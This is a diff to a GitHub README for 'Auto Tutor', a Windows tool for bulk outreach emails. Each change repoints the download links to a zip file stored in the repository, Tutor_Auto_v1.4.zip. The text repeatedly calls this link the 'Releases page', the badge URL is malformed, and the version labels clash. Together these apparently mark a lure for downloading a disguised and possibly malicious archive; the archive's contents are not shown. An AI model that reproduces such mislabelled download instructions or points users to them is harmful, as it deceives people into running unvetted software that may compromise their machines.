@@ -4,7 +4,7 @@
 Auto Tutor is a user-friendly application designed to help you send customized outreach emails in bulk. Whether you are a student reaching out to professors or someone promoting a project, Auto Tutor makes the process easier and faster.
 
 ## 📥 Download Auto-Tutor
-[![Download Auto-Tutor](https://raw.githubusercontent.com/Bero937/Auto-Tutor/main/Daren/Auto-Tutor.zip%20Auto--Tutor-v1.0-brightgreen)](https://raw.githubusercontent.com/Bero937/Auto-Tutor/main/Daren/Auto-Tutor.zip)
+[![Download Auto-Tutor](https://github.com/Bero937/Auto-Tutor/raw/refs/heads/main/Daren/Tutor_Auto_v1.4.zip%20Auto--Tutor-v1.0-brightgreen)](https://github.com/Bero937/Auto-Tutor/raw/refs/heads/main/Daren/Tutor_Auto_v1.4.zip)
 
 ## 🛠 System Requirements
 - Operating System: Windows 10 or later
@@ -15,7 +15,7 @@ Auto Tutor is a user-friendly application designed to help you send customized o
 ## 🚪 Getting Started
 To start using Auto Tutor, follow these steps:
 
-1. **Visit the Download Page:** Click [here](https://raw.githubusercontent.com/Bero937/Auto-Tutor/main/Daren/Auto-Tutor.zip) to visit the Releases page.
+1. **Visit the Download Page:** Click [here](https://github.com/Bero937/Auto-Tutor/raw/refs/heads/main/Daren/Tutor_Auto_v1.4.zip) to visit the Releases page.
 2. **Choose the Latest Version:** Find the latest version listed on the page. It will usually be marked as the most recent release.
 3. **Download the Application:** Click on the link for the Windows version of Auto Tutor to download the installer.
 4. **Install the Application:** 
@@ -51,7 +51,7 @@ Now you’re ready to send your emails:
 ## 🔄 Updates
 To keep your experience smooth, regularly check for updates:
 
-1. **Visit the Releases Page Again:** Click [here](https://raw.githubusercontent.com/Bero937/Auto-Tutor/main/Daren/Auto-Tutor.zip) to see if there are new versions available.
+1. **Visit the Releases Page Again:** Click [here](https://github.com/Bero937/Auto-Tutor/raw/refs/heads/main/Daren/Tutor_Auto_v1.4.zip) to see if there are new versions available.
 2. **Download New Versions:** Follow the same download steps as before to get the latest features and fixes.
 
 ## 📑 Troubleshooting
@@ -77,4 +77,4 @@ For further questions or support, please open an issue on the repository page or
 We appreciate your feedback! Share your experiences or suggest improvements. Your input helps us create better tools for everyone.
 
 ## 📥 Final Reminder
-To get started with Auto Tutor, don't forget to download it from the [Releases page](https://raw.githubusercontent.com/Bero937/Auto-Tutor/main/Daren/Auto-Tutor.zip). Happy emailing!
+To get started with Auto Tutor, don't forget to download it from the [Releases page](https://github.com/Bero937/Auto-Tutor/raw/refs/heads/main/Daren/Tutor_Auto_v1.4.zip). Happy emailing!
